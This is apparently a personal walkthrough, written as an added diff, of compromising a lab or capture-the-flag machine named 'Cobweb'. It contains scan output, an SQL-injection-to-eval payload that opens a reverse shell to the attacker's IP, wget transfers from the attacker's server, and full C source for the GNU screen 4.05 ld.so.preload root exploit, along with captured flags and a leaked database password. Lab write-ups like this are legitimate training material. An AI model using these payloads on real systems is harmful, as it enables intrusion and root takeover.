@@ -1,0 +1,220 @@
+																							                     Cobweb Walkthrough
+																										
+Attacker's Machine: 192.168.49.68
+Victim's Machine: 192.168.221.162
+export IP=192.168.221.162
+	
+nmap -Pn -p- -n  --min-rate 1000 $IP --stats-every=5s
+
+21/tcp   open   ftp
+22/tcp   open   ssh
+80/tcp   open   http
+3306/tcp open   mysql
+
+nmap -Pn -n -sC -sV -p21,22,80,3306, $IP --open --stats-every=5s -oN results.txt
+
+21/tcp   open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_Can't get directory listing: ERROR
+22/tcp   open  ssh     OpenSSH 8.0 (protocol 2.0)
+80/tcp   open  http    Apache httpd 2.4.37 ((centos))
+| HTTP/1.1 401 Unauthorized\x0D
+|_  Server returned status 401 but no WWW-Authenticate header.
+|_http-title: Login
+3306/tcp open  mysql?
+
+nmap -sU -n -Pn $IP --top-ports=100 --stats-every=5s --min-rate 1000
+ <!-- nothing -->
+
+Vulnerability Assessment
+
+nmap -n $IP -p 80 -sV --script vuln --stats-every=5s 
+
+
+nikto --url $IP -p 80
+
+Port 21 - FTP
+
+wget -m --no-passive ftp://anonymous:anonymous@$IP
+
+cat access.log 
+
+/.index.php.swp
+
+ROOT LOGIN  on '/dev/tty1'
+
+BOMAn application event log entry.
+
+Port 80
+
+gobuster dir -u http://$IP:80 -w /usr/share/wordlists/find_me.txt -t 40 
+
+/phpinfo              (Status: 200) [Size: 76507]
+
+# Let's check our phpinfo
+
+Server API	FPM/FastCGI
+mysqlnd 5.0.12-dev -
+
+http://192.168.221.162/.index.php.swp
+
+# View page Source
+
+
+1. <?php
+2. http_response_code(200);
+3.
+4. function get_page($conn, $route_string){
+5.   $sql = "SELECT page_data FROM webpages WHERE route_string = \"" . $route_string . "\";";
+6.    //echo "<!-- " . $sql . " -->";
+7.    if(mysqli_multi_query($conn, $sql)){
+        $results = mysqli_use_result($conn);
+        $first_row = mysqli_fetch_row($results);
+        echo mysqli_error($conn);
+        return($first_row[0]);
+    }else{
+        http_response_code(404);
+        echo mysqli_error($conn);
+        return("");
+    }
+
+}
+
+define("included", true);
+include "config.php";
+
+$conn = mysqli_connect($db_server, $db_username, $db_password, $db_database);
+
+if ($conn->connect_error) {
+    die("Connection failed: " . $conn->connect_error);
+}
+
+29. if(isset($_SERVER['REDIRECT_URL'])){
+30.   $route_string = $_SERVER['REDIRECT_URL'];
+31.   eval(get_page($conn, $route_string));
+32. }else{
+33.    eval(get_page($conn, "/"));
+34. }
+
+
+mysqli_close($conn);
+
+?>
+
+# Reviewing the source on line 5, we find the code is not sanitizing user input fed into mysqli_multi_query() on line 7, leading to an SQL injection vulnerability. 
+   The URL is placed into $route_string on line 30 and returned into an eval() function on lines 31 and 33. The eval() function is used to evaluate a string as PHP code, and we can use the native PHP function shell_exec() to execute arbitrary code of our choosing.
+
+# Creating the payload
+"; INSERT INTO webpages(route_string, page_data) VALUES ('/test', 'echo shell_exec("bash -i >& /dev/tcp/192.168.45.5/5555 0>&1");'); -- 
+
+# URL encode it
+
+curl http://192.168.221.162/%22%3B%20INSERT%20INTO%20webpages%28route_string%2C%20page_data%29%20VALUES%20%28%27%2Ftest%27%2C%20%27echo%20shell_exec%28%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.5%2F5555%200%3E%261%22%29%3B%27%29%3B%20--%20
+
+# Start a netcat listener
+
+nc -lvnp 5555
+
+# Browse to our endpoint to trigger the reverse shell.
+
+curl http://192.168.221.162/test                                # Got shell
+
+cat /home/derek/local.txt                                     # Flag: 9378eb90df0b99b5858044b6ed96fae7
+
+Privilege escalation
+
+
+cat config.php
+<?php
+defined('included') || die();
+
+$db_username = "website";
+$db_password = "4c0b569e4c96df157eee1b65dd0e4d41";
+$db_server = "127.0.0.1";
+$db_database = "website";
+
+
+find / -perm -u=s -type f 2>/dev/null
+
+/usr/bin/screen-4.5.0
+
+screen --version
+Screen version 4.05.00 (GNU) 10-Dec-16
+
+# We already know that screen v4.05 is vulnerable. However, the machine is running CentOS 8.4. 
+
+https://www.exploit-db.com/raw/41154
+
+cat /etc/*-release
+CentOS Linux release 8.4.2105
+
+# This OS often mounts directories /tmp and /dev/shm with nosuid. The nosuid mount option specifies that the filesystem cannot contain setuid files. 
+   Therefore, we'll need to modify the exploit to use another directory we can write to. Let's search for other writable directories. 
+ 
+ find / -writable -type d 2>/dev/null
+ 
+ /dev/mqueue
+/dev/shm
+/proc/2172/task/2172/fd
+/proc/2172/fd
+/proc/2172/map_files
+/var/lib/php/opcache
+/var/lib/php/session
+/var/lib/php/wsdlcache
+/var/lib/dav
+/var/lib/httpd
+/var/log/php-fpm
+/var/cache/httpd
+/var/cache/httpd/proxy
+/var/tmp
+/tmp
+
+# We have a bunch of options, let's go for /var/log/php-fpm
+   This fucking machine is a headache, so let's create out libraries locally and we will transfer them afterwards. 
+   Since we won't use the default path used in the exploit (/tmp/ folder) we will have to modify the original exploit to contain our current path /var/log/php-fpm.
+   
+nano libhax.c
+ #include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+__attribute__ ((__constructor__))
+void dropshell(void){
+    chown("/var/log/php-fpm/rootshell", 0, 0);
+    chmod("/var/log/php-fpm/rootshell", 04755);
+    unlink("/etc/ld.so.preload");
+    printf("[+] done!\n");
+}
+
+
+# Create the second library required for our exploit
+
+nano rootshell.c
+#include <stdio.h>
+int main(void){
+    setuid(0);
+    setgid(0);
+    seteuid(0);
+    setegid(0);
+    execvp("/bin/sh", NULL, NULL);
+}
+
+# Transfer both files on thevictim's machine to our world writable directory /var/log/php-fpm/.
+python3 -m http.server 80
+
+wget 192.168.45.5/libhax.so
+wget 192.168.45.5/rootshell
+
+# Compile it
+gcc -fPIC -shared -ldl -o libhax.so libhax.c
+gcc -o rootshell rootshell.c  
+
+chmod +x rootshell
+
+cd /etc
+umask 000
+screen -D -m -L ld.so.preload echo -ne  "\x0a/var/log/php-fpm/libhax.so"
+screen -ls
+/var/log/php-fpm/rootshell
+id
+uid=0(root) gid=0(root) groups=0(root),48(apache)
+cat /root/proof.txt                                                           # Flag: 7e121fabd4fd6e0de0227d94a7bbfe22
